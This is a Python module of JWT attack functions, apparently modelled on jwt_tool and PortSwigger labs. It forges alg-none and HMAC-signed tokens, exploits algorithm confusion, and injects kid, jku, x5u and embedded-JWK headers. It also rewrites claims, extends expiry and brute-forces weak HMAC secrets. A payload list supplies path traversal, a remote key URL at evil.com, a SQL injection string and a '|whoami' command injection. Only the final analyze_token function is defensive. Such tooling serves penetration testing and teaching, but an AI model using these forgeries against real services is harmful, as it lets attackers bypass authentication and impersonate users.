"""
Advanced JWT attacks — auth0/jwt_tool + PortSwigger class.

Attacks: none alg, HS forge, alg confusion helpers, kid injection, jku/x5u,
embed JWK, claim manipulation, timing-safe-ish compare helpers.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from typing import Any


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(data: str) -> bytes:
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)


def _b64url_json(obj: dict) -> str:
    return _b64url(json.dumps(obj, separators=(",", ":"), sort_keys=False).encode())


def _parse_parts(token: str) -> tuple[dict, dict, str]:
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError("JWT must have 3 parts")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    return header, payload, parts[2]


def forge_none(payload: dict | str, strip_signature: bool = True) -> dict[str, Any]:
    if isinstance(payload, str):
        payload = json.loads(payload)
    header = {"alg": "none", "typ": "JWT"}
    body = f"{_b64url_json(header)}.{_b64url_json(payload)}"
    token = body + ("." if strip_signature else ".x")
    return {"token": token, "header": header, "payload": payload, "attack": "alg-none"}


def forge_hs(
    payload: dict | str,
    secret: str,
    alg: str = "HS256",
    header_extra: dict | None = None,
) -> dict[str, Any]:
    if isinstance(payload, str):
        payload = json.loads(payload)
    hmap = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    if alg not in hmap:
        raise ValueError("alg must be HS256/384/512")
    header = {"alg": alg, "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    msg = f"{_b64url_json(header)}.{_b64url_json(payload)}".encode()
    sig = hmac.new(secret.encode() if isinstance(secret, str) else secret, msg, hmap[alg]).digest()
    token = msg.decode() + "." + _b64url(sig)
    return {"token": token, "header": header, "payload": payload, "attack": "hs-sign", "alg": alg}


def forge_hs_bytes(payload: dict | str, secret: bytes, alg: str = "HS256") -> dict[str, Any]:
    """Sign with raw bytes secret (alg confusion: RS256 public key as HMAC secret)."""
    if isinstance(payload, str):
        payload = json.loads(payload)
    hmap = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    header = {"alg": alg, "typ": "JWT"}
    msg = f"{_b64url_json(header)}.{_b64url_json(payload)}".encode()
    sig = hmac.new(secret, msg, hmap[alg]).digest()
    return {
        "token": msg.decode() + "." + _b64url(sig),
        "header": header,
        "payload": payload,
        "attack": "hs-sign-bytes",
        "note": "Use for alg confusion when treating RSA public key as HMAC secret",
    }


def kid_injection(
    payload: dict | str,
    kid: str,
    secret: str = "secret",
    alg: str = "HS256",
) -> dict[str, Any]:
    """
    Embed dangerous kid values (path traversal, SQL, command).
    Caller supplies the kid; we sign with provided secret.
    """
    if isinstance(payload, str):
        payload = json.loads(payload)
    return forge_hs(payload, secret, alg=alg, header_extra={"kid": kid})


def kid_payloads() -> dict[str, Any]:
    return {
        "payloads": [
            {"kid": "../../dev/null", "note": "empty secret if file read returns empty"},
            {"kid": "../../../../../../dev/null", "note": "path traversal"},
            {"kid": "http://evil.com/key.pem", "note": "remote key (if jku-like fetch)"},
            {"kid": "' OR '1'='1", "note": "SQL injection in kid lookup"},
            {"kid": "|whoami", "note": "command injection in key path"},
            {"kid": "key.pem", "note": "relative path"},
        ]
    }


def jku_header(payload: dict | str, jku_url: str, secret: str = "x", alg: str = "HS256") -> dict[str, Any]:
    if isinstance(payload, str):
        payload = json.loads(payload)
    return forge_hs(payload, secret, alg=alg, header_extra={"jku": jku_url})


def x5u_header(payload: dict | str, x5u_url: str, secret: str = "x", alg: str = "HS256") -> dict[str, Any]:
    if isinstance(payload, str):
        payload = json.loads(payload)
    return forge_hs(payload, secret, alg=alg, header_extra={"x5u": x5u_url})


def embed_jwk(payload: dict | str, jwk: dict, alg: str = "RS256") -> dict[str, Any]:
    """Embed a JWK in the header (some libs trust header.jwk). Signature is placeholder."""
    if isinstance(payload, str):
        payload = json.loads(payload)
    header = {"alg": alg, "typ": "JWT", "jwk": jwk}
    token = f"{_b64url_json(header)}.{_b64url_json(payload)}.SIG"
    return {"token": token, "header": header, "payload": payload, "attack": "embed-jwk"}


def claim_set(
    token: str,
    set_claims: dict | None = None,
    remove_claims: list | None = None,
    resign_secret: str = "",
    resign_alg: str = "HS256",
) -> dict[str, Any]:
    header, payload, sig = _parse_parts(token)
    if remove_claims:
        for c in remove_claims:
            payload.pop(c, None)
    if set_claims:
        payload.update(set_claims)
    if resign_secret:
        forged = forge_hs(payload, resign_secret, alg=resign_alg, header_extra={k: v for k, v in header.items() if k not in ("alg", "typ")})
        return {**forged, "attack": "claim-set-resign", "original_sig": sig}
    # unsigned modification (for none-alg endpoints)
    new_header = dict(header)
    token_out = f"{_b64url_json(new_header)}.{_b64url_json(payload)}.{sig}"
    return {
        "token": token_out,
        "header": new_header,
        "payload": payload,
        "attack": "claim-set",
        "note": "signature preserved (invalid unless server skips verify)",
    }


def expire_extend(token: str, extra_seconds: int = 365 * 24 * 3600, resign_secret: str = "") -> dict[str, Any]:
    header, payload, sig = _parse_parts(token)
    now = int(time.time())
    payload["exp"] = now + int(extra_seconds)
    payload["iat"] = now
    if resign_secret:
        return forge_hs(payload, resign_secret, alg=header.get("alg") or "HS256")
    return claim_set(token, set_claims={"exp": payload["exp"], "iat": payload["iat"]})


def crack_hs(
    token: str,
    wordlist: str = "secret,password,123456,admin,jwt,key,changeme,test,pass,token",
    alg: str = "",
) -> dict[str, Any]:
    """
    Offline HMAC secret brute against a small wordlist (browser-safe sizes only).
    wordlist: comma-separated secrets
    """
    header, payload, sig = _parse_parts(token)
    alg = alg or header.get("alg") or "HS256"
    hmap = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    if alg not in hmap:
        return {"ok": False, "error": f"unsupported alg for offline crack: {alg}"}
    msg = token.rsplit(".", 1)[0].encode()
    target = _b64url_decode(sig)
    tried = 0
    for w in wordlist.split(","):
        w = w.strip()
        if not w:
            continue
        tried += 1
        digest = hmac.new(w.encode(), msg, hmap[alg]).digest()
        if hmac.compare_digest(digest, target):
            return {"ok": True, "found": True, "secret": w, "alg": alg, "tried": tried}
    return {"ok": True, "found": False, "tried": tried, "alg": alg}


def analyze_token(token: str) -> dict[str, Any]:
    try:
        header, payload, sig = _parse_parts(token)
    except Exception as e:
        return {"ok": False, "error": str(e)}
    findings = []
    alg = (header.get("alg") or "").upper()
    if alg in ("NONE", "N0NE", "NONE "):
        findings.append({"severity": "critical", "id": "alg-none", "message": "alg is none — signature not required"})
    if "jwk" in header:
        findings.append({"severity": "high", "id": "embedded-jwk", "message": "Header embeds JWK"})
    if "jku" in header:
        findings.append({"severity": "high", "id": "jku", "message": f"jku={header['jku']}"})
    if "x5u" in header:
        findings.append({"severity": "high", "id": "x5u", "message": f"x5u={header['x5u']}"})
    if "kid" in header:
        kid = str(header["kid"])
        findings.append({"severity": "info", "id": "kid", "message": f"kid={kid}"})
        if ".." in kid or kid.startswith("/") or "http" in kid.lower():
            findings.append({"severity": "high", "id": "kid-suspicious", "message": "kid looks like path/url"})
    if "exp" not in payload:
        findings.append({"severity": "medium", "id": "no-exp", "message": "no exp claim"})
    else:
        try:
            if int(payload["exp"]) < time.time():
                findings.append({"severity": "info", "id": "expired", "message": "token expired"})
        except Exception:
            pass
    return {
        "ok": True,
        "header": header,
        "payload": payload,
        "signature_len": len(sig),
        "alg": alg,
        "findings": findings,
    }
